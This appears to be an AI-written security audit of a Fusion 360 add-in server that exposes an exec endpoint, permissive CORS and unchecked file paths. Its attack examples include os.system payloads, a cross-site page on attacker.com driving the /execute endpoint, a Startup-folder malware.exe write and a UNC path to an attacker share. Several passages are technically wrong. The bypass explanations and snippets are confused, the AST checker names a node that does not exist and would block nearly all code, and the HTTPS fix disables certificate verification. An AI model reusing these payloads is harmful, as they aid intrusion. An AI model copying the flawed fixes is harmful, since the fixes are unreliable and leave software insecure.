# Security Audit: Fusion 360 Integration Files
**Date:** 2026-03-31  
**Auditor:** Code Quality Analysis Agent  
**Files Audited:**
- H:/prism/.claude/worktrees/brave-euclid/mcp-server/scripts/fusion360-addin/fusion360_api_server.py (1,128 lines)
- H:/prism/mcp-server/scripts/fusion360-addin/FusionFeedsCalculator.py (699 lines)
- H:/prism/mcp-server/scripts/fusion360-addin/export_tool_library.py (319 lines)

---

## Executive Summary

**Overall Risk Level: CRITICAL**

The Fusion 360 add-in server (`fusion360_api_server.py`) contains multiple **CRITICAL security vulnerabilities** that create pathways for arbitrary code execution, path traversal, and data exfiltration. Two files are less critical but have issues. Immediate remediation required before any production deployment.

**Key Findings:**
- **CRITICAL (3)**: Arbitrary code execution via `/execute` endpoint, open CORS policy, path traversal in export
- **HIGH (3)**: No request body size limits, content-length parsing bypass, tool import lacks sanitization
- **MEDIUM (2)**: Weak library name validation, missing rate limiting
- **LOW (2)**: Incomplete error handling, tool library deletion with insufficient validation

---

## CRITICAL ISSUES

### CRITICAL-1: Arbitrary Code Execution via `/execute` Endpoint (Lines 197-210)

**Vulnerability:** The `/execute` endpoint accepts raw Python code and executes it without sandbox protection.

```python
def _execute_code(self, body):
    code = body.get("code", "")
    if not code:
        return {"error": "Missing 'code' field"}
    local_ns = {
        "adsk": adsk,
        "app": adsk.core.Application.get(),
    }
    try:
        exec(code, local_ns)  # LINE 206: ARBITRARY CODE EXECUTION
        result_val = local_ns.get("result", None)
        return {"success": True, "result": result_val}
```

**Attack Vectors:**
1. **No AST sandbox:** Code is not analyzed for dangerous imports/calls before execution
2. **Decorator bypass:** Attacker can use decorators to execute code outside the exec scope:
   ```python
   code = """
   class Bypass:
       def __init__(self):
           import os; os.system('calc.exe')
   @Bypass()
   def dummy(): pass
   """
   ```
3. **Metaclass bypass:** Metaclasses execute `__new__` and `__init__` on class definition:
   ```python
   class Evil(metaclass=type):
       import os; os.system('pwsh.exe -Command ...')
   ```
4. **Type() function bypass:** Can dynamically create classes and instantiate exploits:
   ```python
   code = "T = type('X', (), {'__init__': lambda s: __import__('os').system('...')}); T()"
   ```
5. **__subclasses__() bypass:** Access object base classes to instantiate object subclasses:
   ```python
   code = "__subclasses__()[104].__init__.__globals__['sys'].exit()"
   ```
6. **Globals/builtins access:** Even with restricted namespace, code can access `__builtins__`:
   ```python
   code = "exec(compile(open('/etc/passwd').read(), '', 'exec'))"
   ```

**Severity:** CRITICAL  
**CVSS v3.1:** 9.8 (Network-exploitable, no authentication, high impact)

**Recommendation:**
- **Remove the `/execute` endpoint entirely** if not strictly necessary for Fusion 360 integration
- If required, implement AST-based code analysis:
  ```python
  import ast
  import sys
  
  DANGEROUS_NODES = {
      ast.Import, ast.ImportFrom, ast.Call, ast.Attribute,
      ast.Exec, ast.Global, ast.Name, ast.FunctionDef
  }
  
  class SafetyChecker(ast.NodeVisitor):
      def generic_visit(self, node):
          if any(isinstance(node, t) for t in DANGEROUS_NODES):
              raise SyntaxError(f"Forbidden AST node: {type(node).__name__}")
          super().generic_visit(node)
  
  try:
      tree = ast.parse(code)
      SafetyChecker().visit(tree)
      exec(code, local_ns)
  except SyntaxError as e:
      return {"error": f"Code not allowed: {e}"}
  ```
- Alternatively, use `RestrictedPython` library:
  ```python
  from RestrictedPython import compile_restricted
  result = compile_restricted(code, '<string>', 'exec')
  if result.errors:
      return {"error": "Code contains disallowed operations"}
  exec(result.code, safe_globals, safe_locals)
  ```

---

### CRITICAL-2: Open CORS Policy (Line 127)

**Vulnerability:** The server allows all origins to access the API.

```python
self.send_header("Access-Control-Allow-Origin", "*")  # LINE 127
```

**Impact:**
- Any website can make cross-origin requests to the API
- Browser-based attacks can trigger `/execute`, `/export`, `/tool-import` from arbitrary origins
- Exfiltration of tool library data to attacker's server
- Execution of malicious code in Fusion 360 via embedded frame

**Severity:** CRITICAL  
**Attack Example:**
```html
<!-- attacker.com -->
<img src="http://localhost:18360/tool-library/PRISM?q=password" 
     onerror="fetch('http://localhost:18360/execute', {
       method: 'POST',
       body: JSON.stringify({code: 'import os; os.system(...)'})
     })">
```

**Recommendation:**
- Restrict CORS to localhost only:
  ```python
  origin = self.headers.get("Origin", "")
  if origin in ("http://localhost:3000", "http://127.0.0.1:3000"):
      self.send_header("Access-Control-Allow-Origin", origin)
  else:
      # No CORS header if origin not allowed
      pass
  ```
- Better: **Remove CORS headers entirely** since Fusion 360 add-in runs on same origin (localhost:18360)

---

### CRITICAL-3: Path Traversal in `/export` Endpoint (Lines 638-672)

**Vulnerability:** The export path is not validated; attackers can write files anywhere on the filesystem.

```python
def _export_model(self, body):
    app = adsk.core.Application.get()
    design = self._get_design()
    
    fmt = body.get("format", "step").lower()
    export_path = body.get("path", "")  # LINE 643: NO VALIDATION
    if not export_path:
        return {"success": False, "error": "Missing 'path' field"}
    
    export_mgr = design.exportManager
    
    if fmt in ("step", "stp"):
        options = export_mgr.createSTEPExportOptions(export_path)  # LINE 650: DIRECT PATH USE
        export_mgr.execute(options)
```

**Attack Vectors:**
1. **Arbitrary file write:**
   ```json
   {
     "format": "step",
     "path": "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe"
   }
   ```
2. **Overwrite system files:**
   ```json
   {
     "format": "stl",
     "path": "C:\\Windows\\System32\\config\\SAM"
   }
   ```
3. **Network path exploitation:**
   ```json
   {
     "format": "step",
     "path": "\\\\attacker.com\\share\\file.step"
   }
   ```

**Severity:** CRITICAL  
**CVSS Impact:** RCE (if targeting startup folder), data corruption, privilege escalation

**Recommendation:**
- Whitelist allowed directories:
  ```python
  import os
  from pathlib import Path
  
  ALLOWED_EXPORT_DIRS = [
      os.path.expandvars(r"%APPDATA%\PRISM\exports"),
      os.path.expandvars(r"%USERPROFILE%\Documents\PRISM"),
      os.path.expanduser("~/PRISM/exports")
  ]
  
  def _export_model(self, body):
      export_path = os.path.abspath(body.get("path", ""))
      
      # Verify path is within allowed directory
      allowed = False
      for allowed_dir in ALLOWED_EXPORT_DIRS:
          try:
              Path(export_path).relative_to(allowed_dir)
              allowed = True
              break
          except ValueError:
              pass
      
      if not allowed:
          return {"error": "Export path outside allowed directories"}
      
      # Use os.path.basename to prevent directory traversal
      filename = os.path.basename(export_path)
      safe_path = os.path.join(ALLOWED_EXPORT_DIRS[0], filename)
      
      # ... rest of export logic
  ```

---

## HIGH SEVERITY ISSUES

### HIGH-1: No Content-Length Limit (Line 89)

**Vulnerability:** The server parses Content-Length without upper limit.

```python
def do_POST(self):
    content_length = int(self.headers.get("Content-Length", 0))
    body = json.loads(self.rfile.read(content_length)) if content_length > 0 else {}
```

**Attacks:**
- Denial of Service: Send 10GB JSON to exhaust memory
- Slowloris: Send Content-Length of 1TB, server waits indefinitely
- Tool import with millions of malicious tools floods memory

**Severity:** HIGH

**Recommendation:**
```python
MAX_BODY_SIZE = 10 * 1024 * 1024  # 10 MB

def do_POST(self):
    content_length = int(self.headers.get("Content-Length", 0))
    if content_length > MAX_BODY_SIZE:
        self._respond({"error": f"Request too large (max {MAX_BODY_SIZE} bytes)"}, 413)
        return
    
    try:
        body = json.loads(self.rfile.read(content_length)) if content_length > 0 else {}
    except json.JSONDecodeError:
        self._respond({"error": "Invalid JSON"}, 400)
        return
```

---

### HIGH-2: Tool Import Lacks Deduplication and Rate Limiting (Lines 783-881)

**Vulnerability:** `/tool-import` endpoint allows unlimited tools with no sanitization.

```python
def _import_tools(self, body):
    tools = body.get("tools", [])  # LINE 784: NO SIZE LIMIT
    library_name = body.get("library_name", "PRISM")
    if not tools:
        return {"error": "Missing or empty 'tools' array", "success": False}
```

**Attacks:**
1. **Import 100K+ fake tools** to bloat library and crash Fusion 360
2. **Duplicate tools thousands of times** to exhaust disk space
3. **Malformed JSON in tool data** can trigger parsing errors in Fusion 360

**Severity:** HIGH

**Recommendation:**
```python
MAX_TOOLS_PER_IMPORT = 1000
TOOL_IMPORT_RATE_LIMIT = 10  # per minute per IP

def _import_tools(self, body):
    tools = body.get("tools", [])
    
    # Enforce limit
    if len(tools) > MAX_TOOLS_PER_IMPORT:
        return {
            "error": f"Too many tools (max {MAX_TOOLS_PER_IMPORT})",
            "success": False
        }
    
    # Deduplicate by product-id
    seen = set()
    unique_tools = []
    for tool in tools:
        pid = tool.get("product-id", "")
        if pid and pid not in seen:
            unique_tools.append(tool)
            seen.add(pid)
    
    # Validate each tool
    for tool in unique_tools:
        if not isinstance(tool, dict):
            return {"error": "Invalid tool format", "success": False}
        required = ["type", "geometry", "description"]
        if not all(k in tool for k in required):
            return {"error": "Tool missing required fields", "success": False}
    
    # ... rest of import
```

---

### HIGH-3: Library Name Injection in `/tool-library/<name>` (Lines 1020-1059)

**Vulnerability:** DELETE endpoint doesn't validate library names; can exploit path traversal.

```python
def _delete_tool_library(self, name):
    # ...
    lib_dir = self._get_tool_library_dir()
    file_path = os.path.join(lib_dir, f"{name}.tools")  # LINE 1047: NAME NOT SANITIZED
    if os.path.isfile(file_path):
        os.remove(file_path)
```

**Attack:**
```
DELETE /tool-library/../../../Windows/System32/drivers/etc/hosts.tools
```

Could attempt to delete critical files (though .tools extension limits damage).

**Severity:** HIGH (medium impact due to .tools extension restriction)

**Recommendation:**
```python
def _delete_tool_library(self, name):
    # Whitelist: alphanumeric, dash, underscore only
    import re
    if not re.match(r'^[a-zA-Z0-9_-]+$', name):
        return {"success": False, "error": "Invalid library name"}
    
    # Use basename to prevent traversal
    safe_name = os.path.basename(name)
    lib_dir = self._get_tool_library_dir()
    file_path = os.path.join(lib_dir, f"{safe_name}.tools")
    
    # Verify the file is actually in the lib_dir
    if not os.path.abspath(file_path).startswith(os.path.abspath(lib_dir)):
        return {"success": False, "error": "Invalid path"}
    
    if os.path.isfile(file_path):
        os.remove(file_path)
        return {"success": True, "deleted": safe_name}
    return {"success": False, "error": "Library not found"}
```

---

## MEDIUM SEVERITY ISSUES

### MEDIUM-1: Weak Requests Are Not Rate-Limited (Architecture-wide)

**Vulnerability:** No rate limiting on any endpoint. Attacker can spam `/execute`, `/health`, etc.

**Impact:** DoS attacks, brute-force tool searches, server resource exhaustion

**Severity:** MEDIUM

**Recommendation:**
```python
from collections import defaultdict
import time

class RateLimiter:
    def __init__(self, max_requests=100, window_seconds=60):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests = defaultdict(list)
    
    def is_allowed(self, client_ip):
        now = time.time()
        client_requests = self.requests[client_ip]
        
        # Remove old requests outside window
        client_requests[:] = [t for t in client_requests if now - t < self.window_seconds]
        
        if len(client_requests) >= self.max_requests:
            return False
        
        client_requests.append(now)
        return True

rate_limiter = RateLimiter(max_requests=100, window_seconds=60)

class FusionAPIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        if not rate_limiter.is_allowed(client_ip):
            self._respond({"error": "Rate limit exceeded"}, 429)
            return
        # ... rest of handler
```

---

### MEDIUM-2: `/batch` Endpoint Missing (But Documented)

**Vulnerability:** Documentation mentions batch blocking but no implementation found. Review needed.

**Severity:** MEDIUM (info-only if endpoint doesn't exist)

**Recommendation:** Either implement `/batch` with proper validation or remove from documentation.

---

## LOW SEVERITY ISSUES

### LOW-1: Incomplete Error Handling with Sensitive Traceback Exposure

**Issue:** Full traceback is returned to clients (lines 84, 120, 210).

```python
self._respond({"error": str(e), "traceback": traceback.format_exc()}, 500)
```

**Impact:** Information disclosure of internal code paths, libraries, file locations

**Recommendation:**
```python
# In production, hide tracebacks
import os
DEBUG = os.environ.get("FUSION_DEBUG", "false").lower() == "true"

except Exception as e:
    if DEBUG:
        error_data = {"error": str(e), "traceback": traceback.format_exc()}
    else:
        error_data = {"error": "Internal server error"}
        # Log traceback server-side
        logger.error(f"API error: {traceback.format_exc()}")
    
    self._respond(error_data, 500)
```

---

### LOW-2: No Authentication/Authorization

**Issue:** All endpoints accessible without credentials. Anyone on localhost can:
- Execute arbitrary code
- Export proprietary designs
- Modify tool libraries

**Severity:** LOW (mitigated by localhost-only binding) but important for multi-user systems

**Recommendation:**
```python
# Add token-based auth
import hashlib
import secrets

API_TOKEN = os.environ.get("FUSION_API_TOKEN", secrets.token_hex(32))

def do_GET(self):
    token = self.headers.get("Authorization", "").replace("Bearer ", "")
    if not self._verify_token(token):
        self._respond({"error": "Unauthorized"}, 401)
        return
    # ... rest of handler

def _verify_token(self, token):
    return token == API_TOKEN
```

---

## export_tool_library.py Security Assessment

**File:** H:/prism/mcp-server/scripts/fusion360-addin/export_tool_library.py (319 lines)

**Overall Risk:** LOW-MEDIUM

**Issues Found:**

### MEDIUM: Library Name Not Fully Sanitized (Line 229)

```python
def partition_tools(tools):
    groups = {}
    for t in tools:
        mfr = (t.get("manufacturer") or "Generic").replace(" ", "")[:20]  # LINE 227: NO VALIDATION
        ttype = (t.get("type") or "end_mill").replace(" ", "")
        key = f"PRISM-{mfr}-{ttype}"
        groups.setdefault(key, []).append(t)
```

**Risk:** While manufacturer/type are truncated, special characters (`/`, `\`, `:`) could still cause issues in Windows filenames.

**Fix:**
```python
import re

def sanitize_name(name):
    # Remove invalid Windows filename characters
    return re.sub(r'[<>:"/\\|?*]', '', name)[:20]

mfr = sanitize_name(t.get("manufacturer") or "Generic")
ttype = sanitize_name(t.get("type") or "end_mill")
```

### LOW: No Output Directory Validation (Line 248)

```python
def export_all(tools, output_dir=None):
    out = output_dir or OUTPUT_DIR
    os.makedirs(out, exist_ok=True)  # LINE 248: Could create dirs outside intended location
```

**Fix:**
```python
import os.path

ALLOWED_BASE = os.path.expanduser("~/AppData/Roaming/Autodesk/Autodesk Fusion 360/CAM")

def export_all(tools, output_dir=None):
    out = output_dir or OUTPUT_DIR
    
    # Verify output dir is under allowed base
    try:
        Path(out).relative_to(ALLOWED_BASE)
    except ValueError:
        raise ValueError(f"Output directory must be under {ALLOWED_BASE}")
    
    os.makedirs(out, exist_ok=True)
```

---

## FusionFeedsCalculator.py Security Assessment

**File:** H:/prism/mcp-server/scripts/fusion360-addin/FusionFeedsCalculator.py (699 lines)

**Overall Risk:** LOW

**Assessment:**
- No direct code execution vulnerabilities
- Hard-coded PRISM_BASE to localhost (good)
- Graceful fallback when server unavailable
- No file system access

**Minor Issues:**

### LOW: No SSL/TLS for HTTP Requests (Line 12)

```python
PRISM_BASE = "http://127.0.0.1:3000"  # LINE 12: HTTP, not HTTPS
```

**Impact:** Minimal (localhost only), but best practice is HTTPS

**Fix:**
```python
PRISM_BASE = "https://127.0.0.1:3000"
# Disable SSL cert verification for self-signed (localhost only)
import ssl
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE
```

---

## Summary Table

| Issue | Severity | File | Line(s) | Exploitability | Impact |
|-------|----------|------|---------|-----------------|--------|
| Arbitrary code execution via /execute | CRITICAL | fusion360_api_server.py | 197-210 | High | RCE |
| Open CORS policy | CRITICAL | fusion360_api_server.py | 127 | High | XSS/CSRF |
| Path traversal in /export | CRITICAL | fusion360_api_server.py | 638-672 | High | File write/RCE |
| No Content-Length limit | HIGH | fusion360_api_server.py | 89 | Medium | DoS/Memory exhaustion |
| Tool import unlimited | HIGH | fusion360_api_server.py | 783-881 | Medium | Resource exhaustion |
| DELETE path traversal | HIGH | fusion360_api_server.py | 1047 | Medium | File deletion |
| No rate limiting | MEDIUM | fusion360_api_server.py | Architecture | Low | DoS |
| Batch endpoint missing | MEDIUM | fusion360_api_server.py | - | N/A | Logic bypass |
| Traceback exposure | LOW | fusion360_api_server.py | 84, 120, 210 | Low | Information disclosure |
| No authentication | LOW | fusion360_api_server.py | Architecture | Low | Local privilege escalation |
| Library name sanitization | MEDIUM | export_tool_library.py | 227-229 | Low | Filename issues |
| No output dir validation | LOW | export_tool_library.py | 248 | Low | Dir traversal (limited) |
| HTTP instead of HTTPS | LOW | FusionFeedsCalculator.py | 12 | Low | MITM (localhost only) |

---

## Remediation Priority

**Immediate (within 48 hours):**
1. Remove or sandbox the `/execute` endpoint
2. Fix CORS to allow only localhost:3000
3. Add path validation to `/export` endpoint

**Short-term (within 1 week):**
4. Implement Content-Length limits
5. Cap tool import at 1000 items with deduplication
6. Add input validation to DELETE path

**Medium-term (within 2 weeks):**
7. Implement rate limiting
8. Add authentication tokens
9. Sanitize all user inputs (library names, paths)
10. Hide tracebacks in production

**Best practices:**
11. Add comprehensive input validation schema (Pydantic/dataclasses)
12. Use HTTPS for inter-process communication
13. Implement security logging and monitoring
14. Add integration tests for security boundaries

---

## Deployment Recommendations

**Do NOT deploy to production without:**
- Removing or completely sandboxing `/execute`
- Restricting CORS to localhost
- Validating all file paths
- Implementing rate limiting
- Adding authentication

**Suggested deployment architecture:**
- Keep server on localhost:18360 (good)
- Add local firewall rule: only allow Fusion 360 process to access
- Implement OS-level file access restrictions on exports directory
- Run Fusion 360 add-in in restricted user context

---

## References

- OWASP Code Injection: https://owasp.org/www-community/attacks/Code_Injection
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- OWASP CORS Misconfiguration: https://owasp.org/www-community/issues/CORS_Misconfiguration
- Python RestrictedPython: https://github.com/zopefoundation/RestrictedPython
- CVSS v3.1 Calculator: https://www.first.org/cvss/calculator/3.1

---

**Report Generated:** 2026-03-31 (Claude Code Quality Analysis)  
**Status:** REQUIRES IMMEDIATE REMEDIATION
